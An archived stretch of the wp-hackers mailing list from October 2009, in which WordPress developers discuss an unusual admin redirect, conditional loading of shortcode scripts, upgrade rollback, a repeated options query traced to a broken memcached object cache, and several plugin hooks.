Message-ID: <177378.10636.qm@web33607.mail.mud.yahoo.com>

Hello Dre Armeda,
I had never seen that type of redirect. But the thing is that it is not doing anything worth seeing. I mean to say that it is just same as usual. 
Check out this admin login: http://www.freecontentforyourwebsite.co.cc/wp-login/
It is using Theme My Login Plugin.
That's all i can help you.


Warm Regards
 
Mohammad Azad Shaikh
Certified Ethical Hacker
Undertaking BE(Computer Engineering)
At
Parul Institute Of Engineering & Technology
Vadodara, India.

Contact No: +919924028603
Email: azad_shaikh786 at yahoo.com
website: http://www.azadshaikh.co.cc





________________________________
From: Dre Feeds <feeds at armeda.com>
To: "wp-hackers at lists.automattic.com" <wp-hackers at lists.automattic.com>
Cc: "wp-hackers at lists.automattic.com" <wp-hackers at lists.automattic.com>
Sent: Mon, 26 October, 2009 11:09:04 PM
Subject: [wp-hackers] /wp-admin redirect

First time I've seen this. Here is the admin login link to a friends  
wp site who just upgraded to 2.8.5 in the last few days:

Http://www.mysticnebula.com/wp-admin

Has anyone ever seen this redirect? It adds /?qu3Ry=wp-admin

First for me, your thoughts are appreciated.

Cheers,
Dre Armeda

Sent from my iPhone

On Oct 26, 2009, at 10:28 AM, raj <websweetweb at gmail.com> wrote:

> Hi all,
>
> I need to add a WYSIWYG editor in an admin screen that my plugin
> creates. I need the wysiwyg editor to be as similar to the one in the
> Add/Edit post/page screen.
>
> Instead of packaging my own wysiwyg editor for distribution, I would
> like to use the inbuilt one. How can this be done?
>
> Warm Regards,
> Raj
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers



      From cricket scores to your friends. Try the Yahoo! India Homepage! http://in.yahoo.com/trynew

From CaptainN at unFocus.com  Mon Oct 26 20:41:59 2009
From: CaptainN at unFocus.com (Kevin Newman)
Date: Mon, 26 Oct 2009 16:41:59 -0400
Subject: [wp-hackers] checking if post has shortcode,
 before header is 	output?
In-Reply-To: <71ddd7490910261212r31ea11ck61a57d5ac800e5cc@mail.gmail.com>
References: <4AE226CA.1050002@unFocus.com>	<349fe48b0910231602n65464a73yd8f95c4f9a2d7b74@mail.gmail.com>
	<4AE3A3A2.4070106@xavisys.com>	<469fb3cc0910260457v2f4d53caxd59fe9c52d3d67a6@mail.gmail.com>
	<4AE5DF51.6010607@xavisys.com>	<161617690910261129of2b5102s74c9b28e523f1a94@mail.gmail.com>
	<71ddd7490910261212r31ea11ck61a57d5ac800e5cc@mail.gmail.com>
Message-ID: <4AE60997.9030506@unFocus.com>

On 10/26/09 3:12 PM, Doug Stewart wrote:
> On Mon, Oct 26, 2009 at 2:29 PM, Otto<otto at ottodestruct.com>  wrote:
>
>    
>> That's because that is not possible. You're basically wanting to know
>> the content returned by the query before you ever run the query
>> itself. Can't be done, because of, you know, time only traveling in
>> one direction. Damn physicists.
>>
>>
>>      
> I anxiously await the Higgs Boson plugin for PHP/MySQL, as this will solve a
> GREAT many problems.
>
>    
+1

From CaptainN at unFocus.com  Mon Oct 26 20:46:54 2009
From: CaptainN at unFocus.com (Kevin Newman)
Date: Mon, 26 Oct 2009 16:46:54 -0400
Subject: [wp-hackers] checking if post has shortcode,
 before header is 	output?
In-Reply-To: <4AE5F19F.5020409@xavisys.com>
References: <4AE226CA.1050002@unFocus.com>	<349fe48b0910231602n65464a73yd8f95c4f9a2d7b74@mail.gmail.com>	<4AE3A3A2.4070106@xavisys.com>	<469fb3cc0910260457v2f4d53caxd59fe9c52d3d67a6@mail.gmail.com>	<4AE5DF51.6010607@xavisys.com>	<e1202cb10910261128h3b2123abr4b60631f16fadc8@mail.gmail.com>
	<4AE5F19F.5020409@xavisys.com>
Message-ID: <4AE60ABE.3090105@unFocus.com>

This is almost what I ended up doing. Outputting the <style> tag might 
violate some standard, but it does work, so I'll keep it that way - and 
adjust for HTML5 later (thanks Ken!). I'm inline outputting the scripts 
too, but moving those to the footer sounds like a good idea.

Getting any of this into the header on only the right pages sounds 
exceedingly difficult, and costly in terms of necessary code bloat, for 
little (any?) benefit.

Thanks for all the suggestions.

Kevin N.


On 10/26/09 2:59 PM, Aaron D. Campbell wrote:
> I still think it would be better to add the JS from the shortcode 
> handler rather than trying to mess with the_content, the_post, 
> $wp_query, $post, etc.  Since it's enqueued inside the shortcode 
> handler you KNOW the shortcode is being executed.  The only drawback 
> is that the JS needs to go in the footer rather than the header, but 
> as far as I know this is actually the recommended way of loading JS so 
> you should code for that anyway.
>
> Jeremy Clarke wrote:
>> On Mon, Oct 26, 2009 at 1:41 PM, Aaron D. Campbell 
>> <aaron at xavisys.com> wrote:
>>> That still doesn't fix the case where more than one query is ran on 
>>> a page,
>>> when someone does something like "$myQuery = new WP_Query($params);" 
>>> you'd
>>> process the main query, but you wouldn't get any of the shortcodes 
>>> in the
>>> custom query.
>>
>> That's a logical point but I suspect that in the majority of cases
>> people are using extra queries to show only parts of  other content,
>> headlines or excerpts, rather than the actual the_content(). In these
>> cases checking the extra queries will actually cause the js to be
>> loaded way more often than desired. If 1/5 articles needs the JS and
>> you have 10 "related" headlines visible in each single.php view then
>> the likelihood that one of the headlines is a post that *would* need
>> the js is very high, and you'll be constantly loading it even though
>> the headlines have no use for it.
>>
>> If you do show extra loops with full content (or you need this to work
>> on indexes/archives that show multiple posts with full content) then
>> +1 for the idea of adding the js to the footer. I believe there's a
>> hook on 'the_post' that would work pretty well to identify posts that
>> get displayed, though if its not too late the_content() would be
>> ideal, as it would only account for posts who's full content ( and
>> thus expanded shortcodes ) are displayed.
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From CaptainN at unFocus.com  Mon Oct 26 20:50:10 2009
From: CaptainN at unFocus.com (Kevin Newman)
Date: Mon, 26 Oct 2009 16:50:10 -0400
Subject: [wp-hackers] checking if post has shortcode,
 before header is output?
In-Reply-To: <C944457E6EB948BDA9CAECE06D079468@KenPC>
References: <4AE226CA.1050002@unFocus.com>
	<C944457E6EB948BDA9CAECE06D079468@KenPC>
Message-ID: <4AE60B82.8000708@unFocus.com>

I ended up putting it in the body. This just makes too much sense (and 
is easy, compared with everything else, which is hard).

Kevin N.



On 10/26/09 4:30 PM, Ken Newman wrote:
> In HTML 5, the <style> element being using in the body is valid if you 
> use the "scoped" attribute :)
> http://www.w3schools.com/html5/tag_style.asp
>
> --------------------------------------------------
> From: "Kevin Newman" <CaptainN at unFocus.com>
>
>> Hello,
>>
>> Is there anyway to check if there your registered shortcode (for a 
>> plugin) is being used in the current post, during some action hook 
>> before the header is output? The idea would be to include CSS and JS 
>> files for the shortcode, only on pages that actually use the 
>> shortcode. I'm doing it inline right now, since wp_enqueue_script is 
>> not available where the shortcode is dealt with.
>>
>> Thanks,
>>
>> Kevin N.
>>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From xavier at borderie.net  Mon Oct 26 20:56:02 2009
From: xavier at borderie.net (Xavier Borderie)
Date: Mon, 26 Oct 2009 21:56:02 +0100
Subject: [wp-hackers] Suggestion: option to backup database and files before
	upgrading WordPress
Message-ID: <9e4ae73e0910261356h28d97a18x9865b783238b11ae@mail.gmail.com>

Ever since WP 2.7, we've been able to upgrade WP in a more-or-less
reliable way - depending on the host, and with the hope of not
breaking themes, plugins, etc.

These last issues have been the main reason why lambda people do not
feel like upgrading, and would rather risk being attacked
(unknowingly) than consciously break their theme.

It would be great of the upgrade mechanism would take the time to make
a local backup of the main database table and the changed files, and
present the user with an interface letting her quickly get back to the
previous version, at the click of the mouse.

Getting people to upgrade is getting hard for people too attached to
their customization (theme, plugins...). Having this would let them
drop that fear, and upgrading while knowing they can eventually get
back if need be.

Do you think there's enough meat in there to create a ticket in Trac for WP3.0?

-- 
Xavier Borderie

From jeremib at gmail.com  Mon Oct 26 21:15:01 2009
From: jeremib at gmail.com (Jeremi Bergman)
Date: Mon, 26 Oct 2009 17:15:01 -0400
Subject: [wp-hackers] SELECT option_name,
	option_value FROM wp_options WHERE autoload = 	'yes'
Message-ID: <f38206c90910261415k1ebf066bt654c7da037d879f0@mail.gmail.com>

Every page load my mysql log fills up and zips by with the same query:
SELECT option_name, option_value FROM wp_options WHERE autoload = 'yes'


I have disabled every plugin, reloaded the page, and I still see this.  I
believe this query over and over is reaking havoc on my server, eventually
bringing it down.

Is this normal?

From dragonfly at dragonflyeye.net  Mon Oct 26 21:18:14 2009
From: dragonfly at dragonflyeye.net (Thomas Belknap)
Date: Mon, 26 Oct 2009 17:18:14 -0400
Subject: [wp-hackers] SELECT option_name,
	option_value FROM wp_options 	WHERE autoload = 'yes'
In-Reply-To: <f38206c90910261415k1ebf066bt654c7da037d879f0@mail.gmail.com>
References: <f38206c90910261415k1ebf066bt654c7da037d879f0@mail.gmail.com>
Message-ID: <77b239a00910261418q50e92cfftce99f99158b6a673@mail.gmail.com>

Try checking your template or going back to the default. Don't know why
someone would query the db directly like that, but its the next most obvious
"just reboot" kind of answer..

}8{D>


On Mon, Oct 26, 2009 at 5:15 PM, Jeremi Bergman <jeremib at gmail.com> wrote:

> Every page load my mysql log fills up and zips by with the same query:
> SELECT option_name, option_value FROM wp_options WHERE autoload = 'yes'
>
>
> I have disabled every plugin, reloaded the page, and I still see this.  I
> believe this query over and over is reaking havoc on my server, eventually
> bringing it down.
>
> Is this normal?
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jeremib at gmail.com  Mon Oct 26 21:19:28 2009
From: jeremib at gmail.com (Jeremi Bergman)
Date: Mon, 26 Oct 2009 17:19:28 -0400
Subject: [wp-hackers] SELECT option_name,
	option_value FROM wp_options WHERE autoload = 	'yes'
In-Reply-To: <f38206c90910261415k1ebf066bt654c7da037d879f0@mail.gmail.com>
References: <f38206c90910261415k1ebf066bt654c7da037d879f0@mail.gmail.com>
Message-ID: <f38206c90910261419i460f76e9oaa3b6fa0ecf6dc1@mail.gmail.com>

Just to make sure it was nothing with my theme, I set it to the default
thing, and see the same thing...

           ......
           2128 Query       SELECT option_name, option_value FROM wp_options
WHERE autoload = 'yes'
           2128 Query       SELECT option_name, option_value FROM wp_options
WHERE autoload = 'yes'
           2128 Query       SELECT option_name, option_value FROM wp_options
WHERE autoload = 'yes'
           2128 Query       SELECT option_name, option_value FROM wp_options
WHERE autoload = 'yes'
           2128 Query       SELECT option_name, option_value FROM wp_options
WHERE autoload = 'yes'
           2128 Query       SELECT option_name, option_value FROM wp_options
WHERE autoload = 'yes'
           2128 Query       SELECT option_name, option_value FROM wp_options
WHERE autoload = 'yes'
           2128 Query       SELECT option_name, option_value FROM wp_options
WHERE autoload = 'yes'
           2128 Query       SELECT option_name, option_value FROM wp_options
WHERE autoload = 'yes'
           2128 Query       SELECT option_name, option_value FROM wp_options
WHERE autoload = 'yes'
           2128 Query       SELECT option_name, option_value FROM wp_options
WHERE autoload = 'yes'
           2128 Query       SELECT option_name, option_value FROM wp_options
WHERE autoload = 'yes'
           2128 Query       SELECT option_name, option_value FROM wp_options
WHERE autoload = 'yes'
           2128 Query       SELECT option_name, option_value FROM wp_options
WHERE autoload = 'yes'
           2128 Query       SELECT option_name, option_value FROM wp_options
WHERE autoload = 'yes'
           2128 Query       SELECT option_name, option_value FROM wp_options
WHERE autoload = 'yes'
           2128 Query       SELECT option_name, option_value FROM wp_options
WHERE autoload = 'yes'
           2128 Query       SELECT option_name, option_value FROM wp_options
WHERE autoload = 'yes'
           2128 Query       SELECT option_name, option_value FROM wp_options
WHERE autoload = 'yes'
           2128 Query       SELECT option_name, option_value FROM wp_options
WHERE autoload = 'yes'
           2128 Query       SELECT option_name, option_value FROM wp_options
WHERE autoload = 'yes'
           2128 Query       SELECT option_name, option_value FROM wp_options
WHERE autoload = 'yes'
091026 17:15:02       2128 Query       SELECT option_name, option_value FROM
wp_options WHERE autoload = 'yes'
           2128 Query       SELECT option_name, option_value FROM wp_options
WHERE autoload = 'yes'
           2128 Quit


On Mon, Oct 26, 2009 at 5:15 PM, Jeremi Bergman <jeremib at gmail.com> wrote:

> Every page load my mysql log fills up and zips by with the same query:
> SELECT option_name, option_value FROM wp_options WHERE autoload = 'yes'
>
>
> I have disabled every plugin, reloaded the page, and I still see this.  I
> believe this query over and over is reaking havoc on my server, eventually
> bringing it down.
>
> Is this normal?
>



-- 
Jeremi Bergman
865-622-7134

From wordpress at dd32.id.au  Mon Oct 26 21:24:37 2009
From: wordpress at dd32.id.au (DD32)
Date: Tue, 27 Oct 2009 08:24:37 +1100
Subject: [wp-hackers] SELECT option_name,
	option_value FROM wp_options 	WHERE autoload = 'yes'
In-Reply-To: <f38206c90910261419i460f76e9oaa3b6fa0ecf6dc1@mail.gmail.com>
References: <f38206c90910261415k1ebf066bt654c7da037d879f0@mail.gmail.com>
	<f38206c90910261419i460f76e9oaa3b6fa0ecf6dc1@mail.gmail.com>
Message-ID: <45055a190910261424n741f016bmea7797c258cdd81c@mail.gmail.com>

That is the query WordPress makes to load all the options on every page load.

You possibly have a few things wrong:
1. You're being DDOS'd by someone requesting the same page over and
over and over and over agaiin
2. You have a high-load website and need to install a caching plugin
3. Your wp_options table is corrupt
4. Your wp_options table includes an incredibly large option (What
permasructure are you using?)
5. Your MySQL server is configured incorrect (Enabling the query cache
usually speeds things up significantly)

Thats all i can think of right now.. But it depends on the server
situation.. How much time is the query taking? How much time is every
page load taking? Howm many pageloads a minute? etc.

2009/10/27 Jeremi Bergman <jeremib at gmail.com>:
> Just to make sure it was nothing with my theme, I set it to the default
> thing, and see the same thing...
>
> ? ? ? ? ? ......
> ? ? ? ? ? 2128 Query ? ? ? SELECT option_name, option_value FROM wp_options
> WHERE autoload = 'yes'
> ? ? ? ? ? 2128 Query ? ? ? SELECT option_name, option_value FROM wp_options
> WHERE autoload = 'yes'
> ? ? ? ? ? 2128 Query ? ? ? SELECT option_name, option_value FROM wp_options
> WHERE autoload = 'yes'
> ? ? ? ? ? 2128 Query ? ? ? SELECT option_name, option_value FROM wp_options
> WHERE autoload = 'yes'
> ? ? ? ? ? 2128 Query ? ? ? SELECT option_name, option_value FROM wp_options
> WHERE autoload = 'yes'
> ? ? ? ? ? 2128 Query ? ? ? SELECT option_name, option_value FROM wp_options
> WHERE autoload = 'yes'
> ? ? ? ? ? 2128 Query ? ? ? SELECT option_name, option_value FROM wp_options
> WHERE autoload = 'yes'
> ? ? ? ? ? 2128 Query ? ? ? SELECT option_name, option_value FROM wp_options
> WHERE autoload = 'yes'
> ? ? ? ? ? 2128 Query ? ? ? SELECT option_name, option_value FROM wp_options
> WHERE autoload = 'yes'
> ? ? ? ? ? 2128 Query ? ? ? SELECT option_name, option_value FROM wp_options
> WHERE autoload = 'yes'
> ? ? ? ? ? 2128 Query ? ? ? SELECT option_name, option_value FROM wp_options
> WHERE autoload = 'yes'
> ? ? ? ? ? 2128 Query ? ? ? SELECT option_name, option_value FROM wp_options
> WHERE autoload = 'yes'
> ? ? ? ? ? 2128 Query ? ? ? SELECT option_name, option_value FROM wp_options
> WHERE autoload = 'yes'
> ? ? ? ? ? 2128 Query ? ? ? SELECT option_name, option_value FROM wp_options
> WHERE autoload = 'yes'
> ? ? ? ? ? 2128 Query ? ? ? SELECT option_name, option_value FROM wp_options
> WHERE autoload = 'yes'
> ? ? ? ? ? 2128 Query ? ? ? SELECT option_name, option_value FROM wp_options
> WHERE autoload = 'yes'
> ? ? ? ? ? 2128 Query ? ? ? SELECT option_name, option_value FROM wp_options
> WHERE autoload = 'yes'
> ? ? ? ? ? 2128 Query ? ? ? SELECT option_name, option_value FROM wp_options
> WHERE autoload = 'yes'
> ? ? ? ? ? 2128 Query ? ? ? SELECT option_name, option_value FROM wp_options
> WHERE autoload = 'yes'
> ? ? ? ? ? 2128 Query ? ? ? SELECT option_name, option_value FROM wp_options
> WHERE autoload = 'yes'
> ? ? ? ? ? 2128 Query ? ? ? SELECT option_name, option_value FROM wp_options
> WHERE autoload = 'yes'
> ? ? ? ? ? 2128 Query ? ? ? SELECT option_name, option_value FROM wp_options
> WHERE autoload = 'yes'
> 091026 17:15:02 ? ? ? 2128 Query ? ? ? SELECT option_name, option_value FROM
> wp_options WHERE autoload = 'yes'
> ? ? ? ? ? 2128 Query ? ? ? SELECT option_name, option_value FROM wp_options
> WHERE autoload = 'yes'
> ? ? ? ? ? 2128 Quit
>
>
> On Mon, Oct 26, 2009 at 5:15 PM, Jeremi Bergman <jeremib at gmail.com> wrote:
>
>> Every page load my mysql log fills up and zips by with the same query:
>> SELECT option_name, option_value FROM wp_options WHERE autoload = 'yes'
>>
>>
>> I have disabled every plugin, reloaded the page, and I still see this. ?I
>> believe this query over and over is reaking havoc on my server, eventually
>> bringing it down.
>>
>> Is this normal?
>>
>
>
>
> --
> Jeremi Bergman
> 865-622-7134
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From peter.westwood at ftwr.co.uk  Mon Oct 26 21:25:15 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Mon, 26 Oct 2009 21:25:15 +0000
Subject: [wp-hackers] SELECT option_name,
	option_value FROM wp_options WHERE autoload = 	'yes'
In-Reply-To: <f38206c90910261415k1ebf066bt654c7da037d879f0@mail.gmail.com>
References: <f38206c90910261415k1ebf066bt654c7da037d879f0@mail.gmail.com>
Message-ID: <0BCF8D15-F279-4234-89F1-8EFE042FCADA@ftwr.co.uk>


On 26 Oct 2009, at 21:15, Jeremi Bergman wrote:

> Every page load my mysql log fills up and zips by with the same query:
> SELECT option_name, option_value FROM wp_options WHERE autoload =  
> 'yes'
>

This query is run by wp_load_alloptions() and should run once per page  
load.

If it is running more than once then it is likely that you have a  
broken object caching plugin installed.

Look for a file called object-cache.php in wp-content.

Cheers
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From jeremib at gmail.com  Mon Oct 26 21:29:07 2009
From: jeremib at gmail.com (Jeremi Bergman)
Date: Mon, 26 Oct 2009 17:29:07 -0400
Subject: [wp-hackers] SELECT option_name,
	option_value FROM wp_options 	WHERE autoload = 'yes'
In-Reply-To: <0BCF8D15-F279-4234-89F1-8EFE042FCADA@ftwr.co.uk>
References: <f38206c90910261415k1ebf066bt654c7da037d879f0@mail.gmail.com> 
	<0BCF8D15-F279-4234-89F1-8EFE042FCADA@ftwr.co.uk>
Message-ID: <f38206c90910261429o7cced154o6be2f695c1df3146@mail.gmail.com>

That was it, I renamed object-cache.php to object-cache.php.old and no
longer see all those entries!  Thanks so much.

This is what file was there:

/*
Name: Memcached
Description: Memcached backend for the WP Object Cache.
Version: 2.0
URI: http://dev.wp-plugins.org/browser/memcached/
Author: Ryan Boren
.....

On Mon, Oct 26, 2009 at 5:25 PM, Peter Westwood
<peter.westwood at ftwr.co.uk>wrote:

>
> On 26 Oct 2009, at 21:15, Jeremi Bergman wrote:
>
>  Every page load my mysql log fills up and zips by with the same query:
>> SELECT option_name, option_value FROM wp_options WHERE autoload = 'yes'
>>
>>
> This query is run by wp_load_alloptions() and should run once per page
> load.
>
> If it is running more than once then it is likely that you have a broken
> object caching plugin installed.
>
> Look for a file called object-cache.php in wp-content.
>
> Cheers
> --
> Peter Westwood
> http://blog.ftwr.co.uk | http://westi.wordpress.com
> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Jeremi Bergman
865-622-7134

From peter.westwood at ftwr.co.uk  Mon Oct 26 21:30:52 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Mon, 26 Oct 2009 21:30:52 +0000
Subject: [wp-hackers] SELECT option_name,
	option_value FROM wp_options 	WHERE autoload = 'yes'
In-Reply-To: <f38206c90910261429o7cced154o6be2f695c1df3146@mail.gmail.com>
References: <f38206c90910261415k1ebf066bt654c7da037d879f0@mail.gmail.com>
	<0BCF8D15-F279-4234-89F1-8EFE042FCADA@ftwr.co.uk>
	<f38206c90910261429o7cced154o6be2f695c1df3146@mail.gmail.com>
Message-ID: <A13C2AB1-B130-49D3-A549-49654ABB41AF@ftwr.co.uk>


On 26 Oct 2009, at 21:29, Jeremi Bergman wrote:

> That was it, I renamed object-cache.php to object-cache.php.old and no
> longer see all those entries!  Thanks so much.
>
> This is what file was there:
>
> /*
> Name: Memcached
> Description: Memcached backend for the WP Object Cache.
> Version: 2.0
> URI: http://dev.wp-plugins.org/browser/memcached/
> Author: Ryan Boren
> .....
>

So you had the memcached object cache installed an it was not working  
correctly.

I guess something is wrong with your memcached setup.

Cheers
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From hypecreations at gmail.com  Mon Oct 26 21:32:50 2009
From: hypecreations at gmail.com (Eric Holmstrom)
Date: Tue, 27 Oct 2009 08:32:50 +1100
Subject: [wp-hackers] Hooking into Post -> Edit Screen
In-Reply-To: <eaaa36c90910261313t75e1ad76m329baa39b8cbbf89@mail.gmail.com>
References: <fa660803.1ca5652.e7e3fbb.491c@BrewerRadio.com>
	<eaaa36c90910261313t75e1ad76m329baa39b8cbbf89@mail.gmail.com>
Message-ID: <acc04ddf0910261432xf9d4270l2478ee9e5b78835d@mail.gmail.com>

Thanks William, Sharon and Mohammad was able to solve my problem

On Tue, Oct 27, 2009 at 7:13 AM, Mohammad Jangda <batmoo at gmail.com> wrote:

> If you really want it in that position you could add your content to the
> $actions array:
>
> <?php
>
>  add_filter('post_row_actions', 'add_below_title', 10, 2);
>
>
> > function add_below_title( $actions, $post ) {
>
>
> > $actions = array_merge(array("stuff"=>"Your new content goes here"),
> > $actions);
>
>
> > return $actions;
>
> }
>
> ?>
>
>
> This should add a span with the class "stuff" and the content "Your new
> content goes here" to the front to the actions.It'll be hidden though, so
> you'll have to add in custom CSS styling to override the WordPress
> defaults.
>
> On Mon, Oct 26, 2009 at 11:42 AM, Sharon Chambers <sharon at brewerradio.com
> >wrote:
>
> > Try the action
> > manage_posts_custom_column
> >
> > Where you could add your own custom column to the edit posts page.
> > -Sharon
> >
> >
> > -----Original Message-----
> > From: wp-hackers-bounces at lists.automattic.com [mailto:
> > wp-hackers-bounces at lists.automattic.com] On Behalf Of Eric Holmstrom
> > Sent: Monday, October 26, 2009 1:32 AM
> > To: wp-hackers at lists.automattic.com
> > Subject: [wp-hackers] Hooking into Post -> Edit Screen
> >
> > Hi All,
> >
> > Is it possible to hook into the admin post -> edit screen and add text
> > under
> > the post title but above the Edit | Quick Edit | Delete | View? I have
> > include an image below which illustrates what I'm trying to achieve.
> >
> > http://img5.imageshack.us/img5/1460/ashec.jpg
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jeremib at gmail.com  Mon Oct 26 21:33:08 2009
From: jeremib at gmail.com (Jeremi Bergman)
Date: Mon, 26 Oct 2009 17:33:08 -0400
Subject: [wp-hackers] SELECT option_name,
	option_value FROM wp_options 	WHERE autoload = 'yes'
In-Reply-To: <A13C2AB1-B130-49D3-A549-49654ABB41AF@ftwr.co.uk>
References: <f38206c90910261415k1ebf066bt654c7da037d879f0@mail.gmail.com> 
	<0BCF8D15-F279-4234-89F1-8EFE042FCADA@ftwr.co.uk>
	<f38206c90910261429o7cced154o6be2f695c1df3146@mail.gmail.com> 
	<A13C2AB1-B130-49D3-A549-49654ABB41AF@ftwr.co.uk>
Message-ID: <f38206c90910261433q1300f80em2b13319a34003d9e@mail.gmail.com>

Thank so much.  I've been working on this thing all day, I should have just
started with the experts!

I'm sure there are differing opinions, but what are some good options for
object caching, or is the built in good in-and-of itself?

On Mon, Oct 26, 2009 at 5:30 PM, Peter Westwood
<peter.westwood at ftwr.co.uk>wrote:

>
> On 26 Oct 2009, at 21:29, Jeremi Bergman wrote:
>
>  That was it, I renamed object-cache.php to object-cache.php.old and no
>> longer see all those entries!  Thanks so much.
>>
>> This is what file was there:
>>
>> /*
>> Name: Memcached
>> Description: Memcached backend for the WP Object Cache.
>> Version: 2.0
>> URI: http://dev.wp-plugins.org/browser/memcached/
>> Author: Ryan Boren
>> .....
>>
>>
> So you had the memcached object cache installed an it was not working
> correctly.
>
> I guess something is wrong with your memcached setup.
>
>
> Cheers
> --
> Peter Westwood
> http://blog.ftwr.co.uk | http://westi.wordpress.com
> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Jeremi Bergman
865-622-7134

From scribu at gmail.com  Mon Oct 26 23:22:48 2009
From: scribu at gmail.com (scribu)
Date: Tue, 27 Oct 2009 01:22:48 +0200
Subject: [wp-hackers] Suggestion: option to backup database and files
	before upgrading WordPress
In-Reply-To: <9e4ae73e0910261356h28d97a18x9865b783238b11ae@mail.gmail.com>
References: <9e4ae73e0910261356h28d97a18x9865b783238b11ae@mail.gmail.com>
Message-ID: <349fe48b0910261622u3cde5c8bkbc70fad70be36e1b@mail.gmail.com>

A rollback mechanism was discussed in a dev-meet in September I think.
Don't know if there's a ticket for it alreay or not.

-- 
http://scribu.net

From bryanharley at gmail.com  Tue Oct 27 01:16:03 2009
From: bryanharley at gmail.com (Bryan Harley)
Date: Mon, 26 Oct 2009 18:16:03 -0700
Subject: [wp-hackers] Why were the image tooltips removed?
Message-ID: <58410e2e0910261816v1544dcffqa6a37b4bd72de428@mail.gmail.com>

I'm sure this question was asked and answered a while ago, but I can't
seem to find it through searching.

On the post screen there used to be pretty tooltips when you hovered
over the icons for "Add an Image," "Add a Video," etc.  Then after one
update, they were suddenly gone.  I hate explaining to clients how to
find the button to add an image, because it's just an icon with no
descriptive text.  At least the tooltip provided a big blatant label
when hovering.  Plus it looked nice.

Always wondering why it was removed....

From xavier at borderie.net  Tue Oct 27 09:44:01 2009
From: xavier at borderie.net (Xavier Borderie)
Date: Tue, 27 Oct 2009 10:44:01 +0100
Subject: [wp-hackers] Suggestion: option to backup database and files
	before upgrading WordPress
In-Reply-To: <349fe48b0910261622u3cde5c8bkbc70fad70be36e1b@mail.gmail.com>
References: <9e4ae73e0910261356h28d97a18x9865b783238b11ae@mail.gmail.com> 
	<349fe48b0910261622u3cde5c8bkbc70fad70be36e1b@mail.gmail.com>
Message-ID: <9e4ae73e0910270244l28019a2dubb410509cf9ef636@mail.gmail.com>

Aah, "rollback", that's the keyword I couldn't remember while writing
that long explanation. Would've saved me a couple paragraphs :)

And thus, there's a ticket already:
http://core.trac.wordpress.org/ticket/10666
...albeit it didn't get much traction.

I'd vote for changed from "Future Release" to "3.0". Other projects
implement it already, it would be a shame to see WP lag behind.

-x.


2009/10/27 scribu <scribu at gmail.com>:
> A rollback mechanism was discussed in a dev-meet in September I think.
> Don't know if there's a ticket for it alreay or not.
>
> --
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Xavier Borderie

From scribu at gmail.com  Tue Oct 27 12:22:32 2009
From: scribu at gmail.com (scribu)
Date: Tue, 27 Oct 2009 14:22:32 +0200
Subject: [wp-hackers] Why were the image tooltips removed?
In-Reply-To: <58410e2e0910261816v1544dcffqa6a37b4bd72de428@mail.gmail.com>
References: <58410e2e0910261816v1544dcffqa6a37b4bd72de428@mail.gmail.com>
Message-ID: <349fe48b0910270522y7e99c60cxf39f685e17e2656@mail.gmail.com>

The tolltips are still there in WP 2.9-rare. Check the HTML.


-- 
http://scribu.net

From steve at sltaylor.co.uk  Tue Oct 27 13:36:18 2009
From: steve at sltaylor.co.uk (Steve Taylor)
Date: Tue, 27 Oct 2009 13:36:18 +0000
Subject: [wp-hackers] using user_has_cap filter
Message-ID: <a21f8bf00910270636n54607d8jb3912e35d3ca90d4@mail.gmail.com>

I'm almost there with comprehending the user_has_cap filter, but I
just need some clarification. If I add a filter like this:

add_filter( 'user_has_cap', 'my_has_cap', 0, 3 );

And then this is my callback function:

function lockDeletion( $allcaps, $caps, $args ) {
    [whatever]
}

As far as I can tell:

$allcaps is an array with capabilities for keys and boolean values

$caps is ????

$args are the extra arguments - post ID, etc. But what is $args[0],
what is $args[1], etc. ????

thanks,

Steve Taylor

From jeremib at gmail.com  Tue Oct 27 15:13:39 2009
From: jeremib at gmail.com (Jeremi Bergman)
Date: Tue, 27 Oct 2009 11:13:39 -0400
Subject: [wp-hackers] Redirect user Not Logged In
Message-ID: <f38206c90910270813s2d509929pd6777bc6dd9efc79@mail.gmail.com>

I would like to redirect users who are not logged in at the earliest place
possible within the code.  Is there a hook that is called first that woudl
be the best place for this?

Thanks

-- 
Jeremi Bergman
865-622-7134

From jeremib at gmail.com  Tue Oct 27 15:17:25 2009
From: jeremib at gmail.com (Jeremi Bergman)
Date: Tue, 27 Oct 2009 11:17:25 -0400
Subject: [wp-hackers] Redirect user Not Logged In
In-Reply-To: <f38206c90910270813s2d509929pd6777bc6dd9efc79@mail.gmail.com>
